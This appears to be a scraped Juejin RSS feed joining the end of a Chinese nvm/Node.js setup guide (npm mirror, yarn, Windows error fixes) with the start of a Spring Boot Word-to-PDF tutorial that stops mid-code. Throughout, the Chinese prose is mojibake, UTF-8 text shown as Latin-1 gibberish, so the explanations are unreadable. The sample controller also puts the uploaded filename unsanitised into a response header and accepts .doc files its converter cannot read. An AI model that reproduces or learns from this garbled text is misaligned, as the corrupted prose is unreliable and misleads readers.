<p>ä»Šå nvm å®‰è£…çš„æ‰€æœ‰ node ç‰ˆæœ¬éƒ½ä¼šæŒ‡å‘æ·˜å®é•œåƒæºäº†</p>
<p>æ£€æŸ¥å½“å‰ npm é•œåƒæº</p>
<pre><code class="hljs language-bash" lang="bash">npm config get registry
</code></pre>
<p>å¦‚æœè¾“å‡ºç»“æœæŒ‡å‘æ·˜å®æº <code>https://registry.npmmirror.com</code> å³ä¿®æ”¹æˆåŠŸï¼›ä»¥åè¿è¡Œ npm xxx å‘½ä»¤å®‰è£…ä¾èµ–åŒ…å°±æ˜¯ä½¿ç”¨çš„æ·˜å® npm é•œåƒäº†ï¼›</p>
<h2 data-id="heading-4">4. nvm å¸¸ç”¨æ“ä½œå‘½ä»¤</h2>
<p>è‡³æ­¤ï¼Œnvm å·²ç»å®‰è£…æˆåŠŸï¼Œä¸‹é¢ä»‹ç»å¸¸ç”¨å‘½ä»¤</p>
<pre><code class="hljs language-bash" lang="bash">nvm v // æ˜¾ç¤ºnvmç‰ˆæœ¬

nvm root // æŸ¥çœ‹nvmçš„å®‰è£…æ ¹è·¯å¾„åœ¨å“ªä¸ªæ–‡ä»¶å¤¹

nvm list // æ˜¾ç¤ºå·²å®‰è£…nodeçš„ç‰ˆæœ¬

nvm list available // æ˜¾ç¤ºæ‰€æœ‰å¯ä»¥ä¸‹è½½çš„nodeç‰ˆæœ¬

nvm install 14.5.0 // å®‰è£…14.5.0ç‰ˆæœ¬node

nvm install latest // å®‰è£…æœ€æ–°ç‰ˆæœ¬node

nvm use 14.5.0 // ä½¿ç”¨14.5.0ç‰ˆæœ¬node

nvm uninstall 14.5.0 // å¸è½½14.5.0ç‰ˆæœ¬node
</code></pre>
<h2 data-id="heading-5">5. ä½¿ç”¨ yarn æ›¿æ¢ npm install</h2>
<p>å› ä¸º npm è®¾è®¡ä¹‹åˆçš„ä¸€äº›å†å²é—ç•™é—®é¢˜ï¼Œä½¿ç”¨ npm è¿›è¡Œä¾èµ–åŒ…çš„å®‰è£…ç»å¸¸ä¼šå‡ºç°è«åå…¶å¦™çš„é”™è¯¯ã€‚å»ºè®®å¤§å®¶ä½¿ç”¨ yarn æ›¿æ¢ npm i è¿›è¡ŒåŒ…çš„å®‰è£…</p>
<pre><code class="hljs language-bash" lang="bash">
npm install -g yarn // å…¨å±€å®‰è£…yarn

yarn -v // æŸ¥çœ‹yarnç‰ˆæœ¬

npm get registry // æŸ¥çœ‹å½“å‰yarnæº

npm config <span class="hljs-built_in">set</span> registry https://registry.npmmirror.com // æ›´æ”¹ä¸ºæ·˜å®yarnæº

yarn install // å®‰è£…package.jsoné‡Œæ‰€æœ‰åŒ…
</code></pre>
<p>å‚è€ƒæ·˜å® npm é•œåƒç«™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnpmmirror.com%2F" target="_blank" title="https://npmmirror.com/" ref="nofollow noopener noreferrer">npmmirror.com/</a></p>
<p>æ³¨æ„ï¼yarn æ˜¯è·Ÿ node ç‰ˆæœ¬è¿›è¡Œç»‘å®šçš„ï¼</p>
<h2 data-id="heading-6">6. nvm å¸¸è§æŠ¥é”™</h2>
<p>ä¸‹é¢æ˜¯æˆ‘æ›¾ç»é‡åˆ°è¿‡çš„æŠ¥é”™ï¼Œå¤§å®¶å¦‚æœç¢°åˆ°åŒæ ·çš„é—®é¢˜å¯ä»¥ä½œä¸ºå‚è€ƒ</p>
<ul>
<li>
<p>nvm åˆ‡æ¢ node æŠ¥é”™</p>
<p>æ³¨æ„ï¼šä½¿ç”¨ nvm use 14.5.0 å‘½ä»¤åˆ‡æ¢ node ç‰ˆæœ¬çš„æ—¶å€™æŠ¥é”™â€œexit status 1: ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ ã¹» ï¿½ï¿½È¨ï¿½ï¿½Ö´ï¿½Ğ´â€ï¼Œé€šè¿‡ç®¡ç†å‘˜èº«ä»½æ‰“å¼€<code>å‘½ä»¤æç¤ºç¬¦</code>åé‡æ–°è¿è¡Œå‘½ä»¤å³å¯è§£å†³</p>
<p>æ³¨æ„ï¼šå¦‚æœå‡ºç°ä¹±ç ï¼Œå¯ä»¥æ‰“å¼€ cmd å‘½ä»¤ï¼Œè¿è¡Œ<code>chcp 65001</code>ï¼Œç„¶åå°†ä¹±ç çš„è¯å¤åˆ¶æŒ‰å›è½¦ï¼Œå³å¯ç¿»è¯‘è¿™å¥ä¹±ç çš„è¯çš„æ„æ€ï¼›ç”šè‡³å°†ä¹±ç çš„è¯å¤åˆ¶åˆ° cmd å‘½ä»¤æŒ‰å›è½¦å°±å¯ä»¥ç¿»è¯‘ï¼›</p>
<p>æ³¨æ„ï¼šå¦‚æœè¿è¡Œ npm install æŠ¥é”™ <code>npm ERR! cb() never called!</code>ï¼Œå¯ä»¥é€šè¿‡åˆ‡æ¢ä¸ºåŸæ¥çš„é•œåƒæº(ä¸ä½¿ç”¨æ·˜å®é•œåƒ)æ¥è§£å†³</p>
<pre><code class="hljs language-bash" lang="bash">npm config <span class="hljs-built_in">set</span> registry https://registry.npmjs.org/
</code></pre>
</li>
<li>
<p>nvm åˆ‡æ¢ node ä¸èµ·ä½œç”¨</p>
<p>é—®é¢˜ï¼šnvm åˆ‡æ¢ node ç‰ˆæœ¬æˆåŠŸï¼ˆCurrently using 64-bit executableï¼‰ï¼Œä½†æ˜¯ node -v å´æç¤ºï¼ˆCurrently using 32-bit executableï¼‰ï¼Œç­‰äºè¯´ node ä¸€ç›´åœç•™åœ¨ä¹‹å‰ç‰ˆæœ¬ï¼Œå¹¶æ²¡æœ‰åˆ‡æ¢æˆåŠŸï¼›</p>
<p>è§£å†³åŠæ³•ï¼š1.å¸è½½å¹²å‡€ node.jsï¼› 2.é‡æ–°ä½¿ç”¨ nvm use æŒ‡å®š node ç‰ˆæœ¬ï¼›</p>
<p>å¤ç›˜å‘ç°é—®é¢˜å‡ºç°çš„åŸå› æ˜¯ï¼šnode.js ä¸å°å¿ƒå®‰è£…æˆäº† 32ï¼ˆ84ï¼‰ä½</p>
</li>
<li>
<p>vscode è¿è¡Œ yarn æŠ¥é”™</p>
<p>åœ¨ cmd é‡Œå¯ä»¥æ­£å¸¸è¿è¡Œ yarn å‘½ä»¤ï¼Œä½†æ˜¯åœ¨ vscode ä¸­è¿è¡ŒæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p>
<p><code>yarn : æ— æ³•åŠ è½½æ–‡ä»¶ C:\nvm4w\nodejs\yarn.ps1ï¼Œå› ä¸ºåœ¨æ­¤ç³»ç»Ÿä¸Šç¦æ­¢è¿è¡Œè„šæœ¬ã€‚</code></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ PowerShellã€‚è¾“å…¥ <code>set-ExecutionPolicy RemoteSigned</code>ï¼›ç„¶åé€‰æ‹© Aã€‚</p>
<p>ç„¶åå›åˆ° vscode è¿è¡Œ <code>yarn -v</code> å³å¯æ­£ç¡®æ˜¾ç¤º yarn ç‰ˆæœ¬å·</p>
</li>
<li>
<p>vscode è¿è¡Œ yarn åˆæŠ¥é”™</p>
<p>æŠ¥é”™å¦‚ä¸‹ï¼š</p>
<p><code>yarn : æ— æ³•å°†â€œyarnâ€é¡¹è¯†åˆ«ä¸º cmdletã€å‡½æ•°ã€è„šæœ¬æ–‡ä»¶æˆ–å¯è¿è¡Œç¨‹åºçš„åç§°ã€‚</code></p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<p>ç»è¿‡æ’æŸ¥ï¼Œæ˜¯å› ä¸ºåœ¨ node ç‰ˆæœ¬ä¸º 19 çš„æ—¶å€™å®‰è£…äº† yarnï¼Œä½†æ˜¯æˆ‘åˆé€šè¿‡ nvm å°† node ç‰ˆæœ¬åˆ‡æ¢åˆ°äº† 21ï¼Œè¿è¡Œ <code>yarn -v</code>å‘½ä»¤å‘ç° yarn ç«Ÿç„¶æœªå®‰è£…ï¼ŸåŸæ¥ yarn ç«Ÿç„¶æ˜¯è·Ÿ node ç»‘å®šçš„ï¼Ÿ</p>
<p>æ‰€ä»¥æˆ‘ç”¨ nvm åˆ‡æ¢ node ä¸º 21 ç‰ˆæœ¬çš„æ—¶å€™ï¼Œè¿è¡Œå‘½ä»¤ <code>npm install -g yarn</code> é‡æ–°å®‰è£… yarnï¼Œç„¶åè¿è¡Œ<code>yarn -v</code>å‘½ä»¤æŸ¥çœ‹ yarn ç‰ˆæœ¬ï¼Œæ­£ç¡®æ˜¾ç¤º yarn ç‰ˆæœ¬ï¼Œè¡¨ç¤ºå·²ç»æˆåŠŸå®‰è£…</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼š3æ­¥è®©Wordä¹–ä¹–å˜PDF]]></title>    <link>https://juejin.cn/post/7589206614929129512</link>    <guid>https://juejin.cn/post/7589206614929129512</guid>    <pubDate>2025-12-30T02:10:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589206614929129512" data-draft-id="7589206614929113128" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼š3æ­¥è®©Wordä¹–ä¹–å˜PDF"/> <meta itemprop="keywords" content="åç«¯,Java,Spring Boot"/> <meta itemprop="datePublished" content="2025-12-30T02:10:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‚Ÿç©ºç å­—"/> <meta itemprop="url" content="https://juejin.cn/user/3139860942296830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ–‡æ¡£å˜å½¢è®°ï¼ŒSpringBootå®æˆ˜ï¼š3æ­¥è®©Wordä¹–ä¹–å˜PDF
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3139860942296830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‚Ÿç©ºç å­—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:10:35.000Z" title="Tue Dec 30 2025 02:10:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æ‚Ÿã€‚</p>
<h2 data-id="heading-0">Wordåˆ°PDFçš„å¥‡å¹»ä¹‹æ—…</h2>
<p>Wordæ–‡æ¡£å°±åƒä¸ªç©¿ç€ç¡è¡£åœ¨å®¶åŠå…¬çš„ç¨‹åºå‘˜â€”â€”<strong>èˆ’æœä½†æœ‰ç‚¹éšæ„</strong>ã€‚è€ŒPDFå‘¢ï¼Ÿå°±æ˜¯ç©¿ä¸Šè¥¿è£…æ‰“ä¸Šé¢†å¸¦ï¼Œå‡†å¤‡å»å‚åŠ è‘£äº‹ä¼šçš„åŒä¸€äººâ€”â€”<strong>ä¸“ä¸šä¸”çº¹ä¸ä¸åŠ¨</strong>ï¼</p>
<p>è¿™è½¬å˜è¿‡ç¨‹å¥½æ¯”ï¼š</p>
<ol>
<li><strong>Wordæ–‡æ¡£</strong>ï¼šâ€œå“ˆï¼æˆ‘çš„å­—ä½“å¯ä»¥éšä¾¿æ¢ï¼Œè¾¹è·å¯ä»¥éšæ„è°ƒï¼Œå›¾ç‰‡è¿˜èƒ½æ‹–æ¥æ‹–å»~â€</li>
<li><strong>PDF</strong>ï¼šâ€œé—­å˜´ï¼ç°åœ¨å¼€å§‹æˆ‘è¯´äº†ç®—ï¼Œæ¯ä¸ªåƒç´ éƒ½ç»™æˆ‘ç«™å¥½å²—ï¼â€</li>
</ol>
<p>SpringBootå®ç°è¿™ä¸ªè½¬æ¢ï¼Œå°±åƒæ˜¯è¯·äº†ä¸ª<strong>æ–‡æ¡£å˜å½¢é‡‘åˆš</strong>ï¼ŒæŠŠè‡ªç”±æ•£æ¼«çš„Wordé©¯åŒ–æˆçºªå¾‹ä¸¥æ˜çš„PDFå£«å…µã€‚ä¸‹é¢å°±è®©æˆ‘å¸¦ä½ è§è¯è¿™åœºâ€œæ ¼å¼é©¯åŒ–ä»ªå¼â€ï¼</p>
<h2 data-id="heading-1">å‡†å¤‡é˜¶æ®µï¼šè£…å¤‡ä½ çš„â€œå˜å½¢å·¥å…·ç®±â€</h2>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šMavenä¾èµ–å¤§é‡‡è´­</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- pom.xml é‡ŒåŠ å…¥è¿™äº›æ³•å® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- SpringBootæ ‡å‡†è£…å¤‡ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- Apache POI - Wordæ–‡æ¡£çš„â€œè¯»å¿ƒæœ¯â€ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.poi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>poi<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.poi<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>poi-ooxml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- OpenPDF - PDFçš„â€œæ‰“å°æœºâ€ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.librepdf<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>openpdf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- æ–‡ä»¶ç±»å‹æ£€æµ‹ - é¿å…æŠŠå›¾ç‰‡å½“Wordå¤„ç† --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tika<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tika-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šé…ç½®å±æ€§æ–‡ä»¶</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">word-to-pdf:</span>
  <span class="hljs-attr">upload-dir:</span> <span class="hljs-string">"uploads/"</span>  <span class="hljs-comment"># Wordæ–‡æ¡£ä¸´æ—¶åœé ç«™</span>
  <span class="hljs-attr">output-dir:</span> <span class="hljs-string">"pdf-output/"</span>  <span class="hljs-comment"># PDFæˆå“ä»“åº“</span>
  <span class="hljs-attr">max-file-size:</span> <span class="hljs-string">10MB</span>  <span class="hljs-comment"># åˆ«æƒ³ç”¨ã€Šæˆ˜äº‰ä¸å’Œå¹³ã€‹æ¥è€ƒéªŒæˆ‘</span>
  
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">servlet:</span>
    <span class="hljs-attr">multipart:</span>
      <span class="hljs-attr">max-file-size:</span> <span class="hljs-string">10MB</span>
      <span class="hljs-attr">max-request-size:</span> <span class="hljs-string">10MB</span>
</code></pre>
<h2 data-id="heading-4">æ ¸å¿ƒä»£ç ï¼šå˜èº«å§ï¼ŒWordå›ï¼</h2>
<h3 data-id="heading-5">1. æ–‡ä»¶ä¸Šä¼ æ§åˆ¶å™¨ï¼ˆæ¥å¾…å‘˜ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;
<span class="hljs-keyword">import</span> org.springframework.web.multipart.MultipartFile;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/doc-transform")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WordToPdfController</span> {
    
    <span class="hljs-meta">@PostMapping("/word-to-pdf")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">convertWordToPdf</span><span class="hljs-params">(
            <span class="hljs-meta">@RequestParam("file")</span> MultipartFile wordFile,
            HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-comment">// 1. æ£€æŸ¥æ–‡ä»¶ï¼šåˆ«æƒ³ç”¨çŒ«å’ªå›¾ç‰‡å†’å……Wordæ–‡æ¡£ï¼</span>
        <span class="hljs-keyword">if</span> (!isWordDocument(wordFile)) {
            response.getWriter().write(<span class="hljs-string">"å–‚ï¼è¿™ä¸æ˜¯Wordæ–‡æ¡£ï¼Œåˆ«éª—æˆ‘ï¼"</span>);
            response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 2. ä¸´æ—¶å­˜æ”¾Wordæ–‡ä»¶ï¼ˆåƒå®‰æ£€å‰çš„æš‚å­˜ï¼‰</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">tempWordFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"temp_"</span> + System.currentTimeMillis() + <span class="hljs-string">".docx"</span>);
        wordFile.transferTo(tempWordFile);
        
        <span class="hljs-comment">// 3. å¼€å§‹å˜å½¢ï¼</span>
        <span class="hljs-type">byte</span>[] pdfBytes = WordToPdfConverter.convert(tempWordFile);
        
        <span class="hljs-comment">// 4. æ¸…ç†ç°åœºï¼ˆåƒç”¨å®Œçš„å˜å½¢é‡‘åˆšæ¢å¤åŸçŠ¶ï¼‰</span>
        tempWordFile.delete();
        
        <span class="hljs-comment">// 5. æŠŠPDFäº¤ç»™ç”¨æˆ·</span>
        response.setContentType(<span class="hljs-string">"application/pdf"</span>);
        response.setHeader(<span class="hljs-string">"Content-Disposition"</span>, 
            <span class="hljs-string">"attachment; filename=\""</span> + 
            wordFile.getOriginalFilename().replace(<span class="hljs-string">".docx"</span>, <span class="hljs-string">".pdf"</span>) + <span class="hljs-string">"\""</span>);
        response.getOutputStream().write(pdfBytes);
        
        System.out.println(<span class="hljs-string">"è½¬æ¢æˆåŠŸï¼åˆä¸€ä¸ªWordè¢«æˆåŠŸé©¯åŒ–æˆPDFï¼"</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWordDocument</span><span class="hljs-params">(MultipartFile file)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> file.getOriginalFilename().toLowerCase();
        <span class="hljs-keyword">return</span> fileName.endsWith(<span class="hljs-string">".docx"</span>) || fileName.endsWith(<span class="hljs-string">".doc"</span>);
    }
}
</code></pre>
<h3 data-id="heading-6">2. è½¬æ¢å™¨æ ¸å¿ƒï¼ˆçœŸæ­£çš„å˜å½¢å¼•æ“ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.apache.poi.xwpf.usermodel.*;
<span class="hljs-keyword">import</span> com.lowagie.text.*;
<span class="hljs-keyword">import</span> com.lowagie.text.pdf.PdfWriter;
<span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WordToPdfConverter</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] convert(File wordFile) <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">pdfOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(wordFile)) {
            <span class="hljs-comment">// 1. æ‰“å¼€Wordæ–‡æ¡£ï¼ˆåƒæ‰“å¼€æ½˜å¤šæ‹‰é­”ç›’ï¼‰</span>
            <span class="hljs-type">XWPFDocument</span> <span class="hljs-variable">document</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XWPFDocument</span>(fis);
            
            <span class="hljs-comment">// 2. åˆ›å»ºPDFæ–‡æ¡£ï¼ˆå‡†å¤‡æ–°å®¶ï¼‰</span>
            <span class="hljs-type">Document</span> <span class="hljs-variable">pdfDocument</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Document</span>();
            PdfWriter.getInstance(pdfDocument, pdfOutputStream);
            pdfDocument.open();
            
            <span class="hljs-comment">// 3. é€æ®µæ¬è¿å†…å®¹ï¼ˆåƒèš‚èšæ¬å®¶ï¼‰</span>
            System.out.println(<span class="hljs-string">"å¼€å§‹æ¬è¿æ®µè½ï¼Œå…±"</span> + document.getParagraphs().size() + <span class="hljs-string">"æ®µ..."</span>);
            
